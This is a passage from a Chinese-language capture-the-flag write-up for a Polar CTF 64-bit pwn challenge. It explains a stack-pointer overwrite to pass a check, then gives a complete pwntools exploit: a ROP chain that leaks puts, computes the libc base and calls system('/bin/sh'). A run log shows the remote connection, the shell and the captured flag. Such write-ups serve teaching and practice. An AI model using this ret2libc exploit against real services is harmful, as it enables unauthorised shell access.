.text:0000000000400836                 mov     eax, [rbp+var_4]
.text:0000000000400839                 cmp     eax, 1
.text:000000000040083C                 jnz     short loc_40084A
.text:000000000040083E                 mov     eax, 0
.text:0000000000400843                 call    wrshell
.text:0000000000400848                 jmp     short loc_400870
```

这里可以看到.text:0000000000400820                 lea     rax, [rbp+var_4]这一行

而var_4本身var_4 = dword ptr -4

就是地址减去一个0x4

scanf函数存在一个偏移的问题

而后面 mov     eax, [rbp+var_4]

所以需要将这个0x4补齐以保证后续输入n的地址无误，也就搞定了这个偏移的问题

要做的就是把rbp的地址覆盖成n的地址

之后传入n的值：520，然后令其执行ret2libc即可

这部分操作的主体内容就是

```python
io.sendline(b'1')   #菜单选择
io.recv()

io.sendline(b'1')   #wrshell函数第一次输入参数
io.recv()

io.sendline(b'1')   #wrshell函数第二次输入参数
io.recv()


n_addr = 0x60108c   #双击n跟进找到n参数的地址
payload = b'a'*(0x50) + p64(n_addr+0x4)    #补齐0x4，确保n地址正确
io.sendline(payload)
io.recv()

io.sendline(b'520')  #通过判断语句
io.recv()
```

奇怪的点在于想用libcsearcher来找对应的libc版本

但是没找到

换用网站手动补齐相关函数对应地址

exp：

```python
from pwn import *


io = remote('1.95.36.136',2146)
# io=process("./pwn")
elf = ELF('./polar_pwn')
# libc= ELF(elf.libc.path)

io.sendline(b'1')
io.recv()

io.sendline(b'1')
io.recv()

io.sendline(b'1')
io.recv()


n_addr = 0x60108c
payload = b'a'*(0x50) + p64(n_addr+0x4)
io.sendline(payload)
io.recv()

io.sendline(b'520')
io.recv()

ret_add =0x00000000004005d9
pop_rdi =0x0000000000400a63
xxx_add =0x00000000004009CE
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

print("Puts_got: ",hex(puts_got))
print("Puts_plt: ",hex(puts_plt))

offset=0x50

payload1 = b'a' * (offset+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(xxx_add)
io.sendlineafter(b'Welcome to Polar CTF!', payload1)
puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print("Puts_addr: ",hex(puts_addr))



libc_base = puts_addr - 0x06f6a0
system_add = libc_base + 0x0453a0
bin_sh_add = libc_base + 0x18ce57

# libc_base = puts_addr - libc.symbols['puts']
# system_add = libc_base + libc.symbols['system']
# bin_sh_add = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'a' * (offset+8) + p64(ret_add) + p64(pop_rdi) + p64(bin_sh_add) + p64(system_add)

io.sendlineafter(b'Welcome to Polar CTF!', payload2)

io.interactive()
```

总体就是一个栈迁移加一个ret2libc

```python
D:\python\pythonProject\.venv\Scripts\python.exe D:\python\pythonProject\polar_pwn_libc64+栈迁移.py 
[x] Opening connection to 1.95.36.136 on port 2146
[x] Opening connection to 1.95.36.136 on port 2146: Trying 1.95.36.136
[+] Opening connection to 1.95.36.136 on port 2146: Done
[*] 'D:\\python\\pythonProject\\polar_pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
Puts_got:  0x601018
Puts_plt:  0x4005f0
Puts_addr:  0x7fc589e1d6a0
[*] Switching to interactive mode

cat flag
flag{e6d6aa72-59ef-42bd-a92b-ac3310081800}
```

总体交互结果更简洁

也表明很多情况下libc库有概率没有，网站好用得一

[libc database search](https://libc.blukat.me/)